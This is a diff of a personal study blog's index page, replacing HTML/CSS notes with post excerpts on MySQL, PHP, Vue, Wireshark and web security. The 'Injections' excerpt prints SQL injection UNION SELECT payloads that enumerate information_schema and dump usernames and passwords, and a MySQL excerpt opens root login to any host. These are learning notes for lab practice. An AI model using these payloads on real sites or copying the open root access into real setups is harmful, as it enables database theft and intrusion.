class="line">7.dashed:虚线</span><br><span class="line">8.dotted 方型点框</span><br><span class="line">9.ridge /outset 表示凸出</span><br><span class="line">overflow:auto：在必需时对象内容才会被裁切或显示 滚动条；</span><br><span class="line">hidden：不显示超过对象尺寸的内容；</span><br><span class="line">scroll：总是显示滚动条。 </span><br></pre></td></tr></table></figure>
-
-<p>表单</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;form=action= &gt;&lt;/&gt;表单结构</span><br><span class="line">action=&quot;提交地址&quot;</span><br><span class="line">method=&quot;提交方式post&quot;</span><br><span class="line">id</span><br><span class="line">&lt;input&gt;表单控件</span><br><span class="line">type=&quot;text&quot;单行文本框</span><br><span class="line">name=&quot;username&quot;密码框</span><br><span class="line">maxlength限制在文本中输入的最大字符长度</span><br><span class="line">size=&quot;5&quot;老表单中显示字符数</span><br><span class="line">type=&quot;password&quot;输入的字符被掩饰</span><br><span class="line">&lt;textarea&gt;&lt;/&gt;多行文本框默认显示的内容</span><br><span class="line">单选按钮</span><br><span class="line">type=&quot;radio&quot;让用户从一系列选项选一个</span><br><span class="line">value=&quot;&quot;选项的内容</span><br><span class="line">checked=&quot;checked&quot;默认选中</span><br><span class="line">name=&quot;genre&quot;一个问题值多选按钮type=&quot;checkbox&quot;namevaluechecked</span><br><span class="line">下拉列表框</span><br><span class="line">&lt;form action=&quot;&quot;&gt;</span><br><span class="line">&lt;select name=&quot;devices&quot;&gt;</span><br><span class="line">&lt;option value=&quot;ipod&quot;&gt;ipod&lt;/&gt;</span><br><span class="line">&lt;option value=&quot;ipod&quot;&gt;ipod&lt;/&gt;</span><br><span class="line">&lt;/&gt;</span><br><span class="line">&lt;/&gt;</span><br><span class="line">多选框</span><br><span class="line">size显示多个多选框</span><br><span class="line">multiple允许用户选择多个选项</span><br><span class="line">&lt;input type=&quot;file&quot;&gt;文件上传域</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;&quot;&gt;提交按钮</span><br><span class="line">&lt;input type=&quot;image&quot; src=&quot;图片路径&quot; width=&quot; &quot; height=&quot;&quot;&gt;图像按钮</span><br><span class="line">&lt;form&gt;&lt;button&gt;&lt;input=&quot;hidden&quot;&gt;&lt;/&gt;&lt;/&gt;</span><br><span class="line"></span><br><span class="line">required=&quot;名称&quot;多个文本行添加该名称 表单验证</span><br><span class="line">type=&quot;date&quot; 日期控件</span><br><span class="line">type=&quot;email&quot; 电子邮件控件</span><br><span class="line">type=&quot;url&quot; URL输入控件</span><br><span class="line">type=&quot;search placeholder=&quot;默认显示&quot;&quot; 搜索输入控件 </span><br></pre></td></tr></table></figure>
-
-<p>flash，视频，音频</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;video src=&quot;xx.mp4&quot; poster=&quot;显示的图片&quot; width height=&quot;&quot; preload=&quot;auto(自动播放)/none(电机播放)&quot; loop结束后重新播放&gt;</span><br><span class="line">&lt;audio src=&quot;音频路径&quot; conteols是否显现播放器 autoplay自动播放&gt;</span><br><span class="line">&lt;audio controls autoplay&gt;&lt;source src=&quot;&quot;&gt;&lt;source src=&quot;&quot;&gt;&lt;source src=&quot;&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;/audio&gt; </span><br></pre></td></tr></table></figure>
-
-<p>css</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">font-family字体选用</span><br><span class="line">font-size: 像素/百分数(100％为16px)/EM值 字体大小</span><br><span class="line">font-weight:bold粗体</span><br><span class="line">font-style:italic(斜体)/oblique(倾斜)</span><br><span class="line">text-transform:uppercase(大写)/lowercase(小写)/capitalize(每个单词首字母大写)</span><br><span class="line">text-decoration:none(删除装饰线)/overline(底部增加一条实线)/line-through(穿过文字的一条实线)/blink(字体闪烁)</span><br><span class="line">line-height:1.4em 行间距</span><br><span class="line">letter-spacing:0.2em字母间距</span><br><span class="line">word-spacing:1em单词间距</span><br><span class="line">text-align:left(左对齐)/right(右对齐)/center(居中)/justify(两段对齐)</span><br><span class="line">vertical-align:baseline</span><br><span class="line">sub</span><br><span class="line">super</span><br><span class="line">top</span><br><span class="line">text-top</span><br><span class="line">middle</span><br><span class="line">bottom</span><br><span class="line">text-bottomtext-indent:20px向右缩进20像素</span><br><span class="line">text-shadow:-1px -1px #666666 投影</span><br><span class="line">选择器:first-letter&#123;&#125;首字母</span><br><span class="line">选择器:first-line&#123;&#125;首行文本</span><br><span class="line">选择器:link&#123;&#125; 为未被访问的链接设置样式</span><br><span class="line">选择器:visited&#123;&#125; 为被访问过的链接设置样式</span><br><span class="line">选择器:hover&#123;&#125; 鼠标停在按钮上改变属性</span><br><span class="line">选择器:active&#123;&#125; 鼠标点击按钮后改变属</span><br><span class="line">选择器:focus&#123;&#125; 拥有焦点时改变属性</span><br><span class="line">width:300px 盒子宽</span><br><span class="line">height:400px 盒子高</span><br><span class="line">min-width:450px 盒子最小自适宽</span><br><span class="line">max-width:650pz 盒子最大自适宽</span><br><span class="line">overflow:scroll 内容超出盒子(溢出)添加滚动滑块</span><br><span class="line">hidden 内容溢出的部分隐藏</span><br><span class="line">border- -width:2px</span><br><span class="line">top/ /right/bottom/left 上/四周/右/下/左</span><br><span class="line">thin薄/medium中等/thick厚</span><br><span class="line">border-style: solid /////边框样式</span><br><span class="line">border-color: 边框颜色</span><br><span class="line">border:3px dotted #666</span><br><span class="line">padding:2px 内边距</span><br><span class="line">margin:2px 外边距</span><br><span class="line">margin:20px auto 居中</span><br><span class="line">visibility:hidden(隐藏元素) /visible(显示元素)-moz(火狐)/webkit(谷歌/safari浏览器)/ms(IE)/o(Opera浏览器)-border-image:url(&quot;图片地址&quot;)</span><br><span class="line">11 11 11 11 stretch伸展图片/repeat重复图片/round自适重复照片 border-image边框图像</span><br><span class="line">box-shadow: 盒子的投影</span><br><span class="line">border-radius:10px 圆角边框</span><br><span class="line">10px 40px 椭圆形边框</span><br><span class="line">list-style-image:url() 项目图像</span><br><span class="line">list-style-position: outside 标记位于文本左侧</span><br><span class="line">inside 标记位于文本内部</span><br><span class="line">border-spacing:5px 15px 单元格距离</span><br><span class="line">border-collapse:collapse 单元格合并</span><br><span class="line">font-size文本大小</span><br><span class="line">background-color 输入框背景颜色</span><br><span class="line">:focus 输入时</span><br><span class="line">background-image:url(&quot;&quot;)背景图像</span><br><span class="line">cursor:move 光标样式</span><br><span class="line">crosshair</span><br><span class="line">default</span><br><span class="line">pointer</span><br><span class="line">move</span><br><span class="line">text</span><br><span class="line">wait</span><br><span class="line">help</span><br><span class="line">url(&quot;&quot;)</span><br><span class="line">&lt;header&gt;&lt;/header&gt;页眉</span><br><span class="line">&lt;footer&gt;&lt;/footer&gt;页脚</span><br><span class="line">&lt;nav&gt;&lt;u1&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;li&gt;&lt;/li&gt;&lt;/u1&gt;&lt;/nav&gt;导航</span><br><span class="line">&lt;article&gt;&lt;figure&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;&lt;/figure&gt;&lt;hgroup&gt;&lt;/hgroup&gt;&lt;/article&gt;文章</span><br><span class="line">&lt;aside&gt;&lt;/aside&gt;附属信息</span><br><span class="line">&lt;section&gt;&lt;/&gt;部分</span><br><span class="line">&lt;hgroup&gt;&lt;/group&gt;标题组</span><br><span class="line">&lt;figure&gt;&lt;img src alt&gt;&lt;figcaption&gt;&lt;/&gt;&lt;/figure&gt;图像</span><br><span class="line">&lt;div&gt;&lt;/&gt; 分节元素</span><br><span class="line">&lt;a href&gt;&lt;article&gt;&lt;figure&gt;&lt;img &gt;&lt;/figure&gt;&lt;/acticle&gt;&lt;/a&gt;为块元素添加链接</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/10/html5/" data-id="clr4slxw90008qofngbfnhcw3" data-title="html5" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2024/01/08/test-my-site/">test_my_site</a>
-          </li>
-        
-          <li>
-            <a href="/2024/01/08/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/">Linux目录结构</a>
-          </li>
-        
-          <li>
-            <a href="/2024/01/08/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">网络基础知识</a>
-          </li>
-        
-          <li>
-            <a href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/">box靶机</a>
-          </li>
-        
-          <li>
-            <a href="/2024/01/08/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/">逻辑漏洞之支付漏洞详解</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2024 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Hexo</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/24/Injections/" title="Injections">Injections</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-24T02:11:30.000Z" title="Created 2023-12-24 10:11:30">2023-12-24</time></span></div><div class="content">SQL InjectionsSQL InjectionsSQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行， 从而导致数据库受损
+判断列
+12order by ?
+
+表
+12union select ?,group_concat(table_name) ,? from information_schema.tables where table_schema=database();
+
+列
+12union select ?, group_concat(column_name),? from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();
+
+数据
+12union select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;
+
+报错函数
+1234567 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/24/%E6%BC%8F%E6%B4%9E/" title="漏洞">漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-24T02:01:43.000Z" title="Created 2023-12-24 10:01:43">2023-12-24</time></span></div><div class="content">漏洞准备php环境
+更改php版本
+
+打开apache2.4.39与mysql5.7.26
+解压sqil到www根目录下
+在火狐浏览器中安装hackbar扩展解压hackbar扩展压缩包
+打开火狐的扩展和主题
+
+从文件安装附加组件
+
+安装完成后通过f12打开开发者工具
+
+nformation schema在mysql多少版本后出现INFORMATION_SCHEMA是一个MySQL特有的数据库模式，它提供了访问数据库元数据的能力，元数据如关于数据库的表、列、索引等的信息。INFORMATION_SCHEMA数据库包含多个只读的视图，这些视图实际上是对MySQL服务器内部数据结构的直接映射。您可以运用标准的 SELECT 语句来查询这些视图以获取有关导入的数据库的信息。INFORMATION_SCHEMA出现在MySQL5.0版本，作为对SQL 标准的一部分实现。对于5.0版本之前的MySQL版本，这些元数据信息只能通过SHOW语句或在特定的系统表如mysql数据库中的表来查询。自从INFORMATION_SCHEMA引入之后，访问元数据变得更为统一和易于跨不同数据库系统进行迁移和查询。 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/24/MySQL%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" title="MySQL的基本操作">MySQL的基本操作</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-24T01:59:04.000Z" title="Created 2023-12-24 09:59:04">2023-12-24</time></span></div><div class="content">MySQL的基本操作进入MySQL：进入MySQL的根目录下的bin目录(……..\MySQL5.7.26\bin)，再在上面栏中输入cmd,点击Ente进入该目录下的命令行窗口
+或者选择直接打开命令行窗口cd到……..\MySQL5.7.26\bin目录下
+再在该窗口中输入，
+12mysql -u root -p #-u用于指定登录MySQL服务器的用户名。-p: 用于指定登录MySQL服务器的密码。
+
+进入root用户的登陆界面
+输入密码，直接Enter登陆，请记住MySQL密码，密码忘记了在找回密码很麻烦很麻烦！且MySQL卸载容易残留内容。
+后续mysql数据库需要使用到远程操控（虚拟机之类）
+解除远程限制12345use mysql; # 使用mysql这个数据库update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;; # 更新&quot;user&quot;表中&quot;User&quot;列为&#x27;root&#x27;的行，将相应行												的&quot;Host&quot;列设置 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/24/yakit%E4%B8%8Epstman%E4%BD%BF%E7%94%A8%E5%AE%89%E8%A3%85/" title="yakit与pstman使用安装">yakit与pstman使用安装</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-24T01:33:32.000Z" title="Created 2023-12-24 09:33:32">2023-12-24</time></span></div><div class="content">yakit与pstman使用安装先安装谷歌浏览器
+到yakit官网下载安装包1https://www.yaklang.io/products/intro/
+
+点击左上角yak头像   下载windows版本
+
+安装后初始化引擎
+
+项目管理中选择default
+
+点击mitm
+
+免配置启动
+启动免配置chrome
+
+请输入目标地址
+
+postman的使用新建项目
+get请求的链接
+链接的获取这里使用ctfshow-web靶场进行使用
+用火狐浏览器打开
+
+火狐浏览器f12打开开发者工具
+选择网络，然后重新加载网页
+
+会出现很多get请求
+
+根据文件响应可以判断api文件请求
+
+复制消息头的get链接放到postman中
+
+send发送后可以看到有数据接受
+
+加入键名id&#x3D;1可以看到
+
+之后就可以进行相关操作了
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/17/html%E5%AF%BC%E5%85%A5vue/" title="html导入vue">html导入vue</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-17T12:44:17.000Z" title="Created 2023-12-17 20:44:17">2023-12-17</time></span></div><div class="content">html导入vue引入样式与引入组件库
+1234567&lt;!-- 引入样式 --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;&lt;!-- 引入组件库 --&gt;&lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://unpkg.com/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;
+
+可以链接访问后复制黏贴到文件目录
+
+文件名要一样
+
+在php文件中调用
+12345&lt;link rel=& ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/17/php%E5%AD%A6%E4%B9%A0/" title="php学习">php学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-17T12:42:52.000Z" title="Created 2023-12-17 20:42:52">2023-12-17</time></span></div><div class="content">php学习phpPHP 是一种创建动态交互性站点的强有力的服务器端脚本语言
+PHP 脚本以  结束：
+1234&lt;?php// PHP 代码?&gt;
+
+PHP 文件的默认文件扩展名是 .php
+PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。
+通过 PHP，有两种在浏览器输出文本的基础指令：echo 和 print。
+PHP 变量与代数类似，可以给 PHP 变量赋予某个值（x&#x3D;5）或者表达式（z&#x3D;x+y）。
+变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。
+PHP 变量规则：
+
+变量以 $ 符号开始，后面跟着变量的名称
+变量名必须以字母或者下划线字符开始
+变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）
+变量名不能包含空格
+变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
+
+echo 和 print
+echo - 可以输出一个或多个字符串
+print - 只允许输出一个字符串，返回值总为 1
+echo 输出的速度比 print 快， echo ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/17/Vue%E4%B8%8Epostman%E4%B8%8Enavicat%E5%AE%89%E8%A3%85/" title="Vue与postman与navicat安装">Vue与postman与navicat安装</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-17T11:56:55.000Z" title="Created 2023-12-17 19:56:55">2023-12-17</time></span></div><div class="content">Vue与postman与navicat安装Vue3安装在用 Vue.js 构建大型应用时推荐使用 cnpm 安装，cnpm 能很好地和 Webpack 或 Browserify 模块打包器配合使用，然后在命令行中运行以下命令：
+1npm create vue@latest
+
+这一指令将会安装并执行 create-vue
+
+如果不确定是否要开启某个功能，你可以直接按下回车键选择 否
+
+在项目被创建后，通过以下步骤安装依赖并启动开发服务器
+123cd vue-projectnpm installnpm run dev
+
+
+成功执行以上命令后访问 **http://localhost:5173/**，输出结果如下所示：
+
+终端输入
+123npm install element-plus -savenpm install -D unplugin-vue-components unplugin-auto-import
+
+
+饿了么网页链接
+12https://element-plus.org/zh-CN/guide/design.html
+
+
+Vue3项目的典型目录结构：
+123456789101 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/17/WireShark%E7%9A%84%E4%BD%BF%E7%94%A8/" title="WireShark的使用">WireShark的使用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-17T11:39:56.000Z" title="Created 2023-12-17 19:39:56">2023-12-17</time></span></div><div class="content">WireShark的使用一丶WireShark的使用网络分析工具WireShark的使用WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位
+WireShark软件安装软件下载路径：wireshark官网。按照系统版本选择下载
+
+管理员身份运行
+
+选择对应的网卡，右键，会出现Start Capture(开始捕获)，点击即可进行捕获该网络信息，开始抓取网络包
+
+执行需要抓包的操作，如ping www.baidu.com。
+
+操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤
+ping操作属于icmp
+
+wireshark抓包完成
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/10/proxifier%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" title="proxifier软件的使用">proxifier软件的使用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-10T03:53:17.000Z" title="Created 2023-12-10 11:53:17">2023-12-10</time></span></div><div class="content">proxifier软件的使用下载proxifier压缩文件，打开猫的局域网连接，打开proxifier,点击配置文件
+
+点击编辑，如图设置，点击确定（ssh*;表示打开所有ssh开头的文件
+
+移除第一行，将default改为direct放行
+
+重启proxifier，win+r，输入cmd，在命令行中输入ssh root@1.1.1.1，会在proxifier出现记录（大概率访问失败）
+
+说明(1) Frame: 物理层的数据顿概况(2) Ethernet ll:数据链路层以太网顿头部信息(3) Internet Protocol Version 4: 互联网层IP包头部信息(4) Transmission Control Protocol: 传输层T的数据段头部信息，此外是TCP(5) Hypertext Transfer Protocol: 应用层的信息，此外是HTTP协议
+协议过滤比较简单，直接在Filter框中直接输入协议名即可。注意: 协议名称需要输入小写tcp，只显示TCP协议的数据包列表http，只查看HTTP协议的数据包列表icmp，只显示ICMP协议的数据包列表
+ i ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/10/html5/" title="html5">html5</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-10T03:28:20.000Z" title="Created 2023-12-10 11:28:20">2023-12-10</time></span></div><div class="content">HTML5基础在VS code中添加拓展，如图所示
+创建一个html文件以便于对html有一个简单的认识
+进入输入指令”!+TAB”则会自动输出基本的框架
+HTML的基本语法：123456789101112131415161718192021222324252627html&lt;b&gt;:加粗&lt;/b&gt;&lt;i&gt;:斜体&lt;/i&gt;&lt;sup&gt;上标&lt;/sup&gt;    &lt;br /&gt;   &lt;!----换行--&gt;    &lt;b&gt;:加粗&lt;/b&gt;    &lt;sub&gt;下标&lt;/sub&gt;    &lt;hr /&gt;&lt;!----分割线--&gt;    &lt;strong&gt;加粗&lt;/strong&gt;&lt;!----注释--&gt;    &lt;em&gt;斜体&lt;/em&gt;    &lt;h1&gt;最大标题&lt;/h1&gt;    &lt;h6&gt;最小标题&lt;/h6&gt;    &lt;s&gt;文字中划线&lt;/s&gt;     ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2024/01/08/test-my-site/" title="test_my_site">test_my_site</a><time datetime="2024-01-08T09:48:43.000Z" title="Created 2024-01-08 17:48:43">2024-01-08</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/01/08/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/" title="Linux目录结构">Linux目录结构</a><time datetime="2024-01-08T09:09:38.000Z" title="Created 2024-01-08 17:09:38">2024-01-08</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/01/08/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="网络基础知识">网络基础知识</a><time datetime="2024-01-08T09:09:04.000Z" title="Created 2024-01-08 17:09:04">2024-01-08</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/" title="box靶机">box靶机</a><time datetime="2024-01-08T02:21:23.000Z" title="Created 2024-01-08 10:21:23">2024-01-08</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/01/08/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="逻辑漏洞之支付漏洞详解">逻辑漏洞之支付漏洞详解</a><time datetime="2024-01-08T02:19:10.000Z" title="Created 2024-01-08 10:19:10">2024-01-08</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">January 2024</span><span class="card-archive-list-count">9</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">December 2023</span><span class="card-archive-list-count">19</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">28</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" 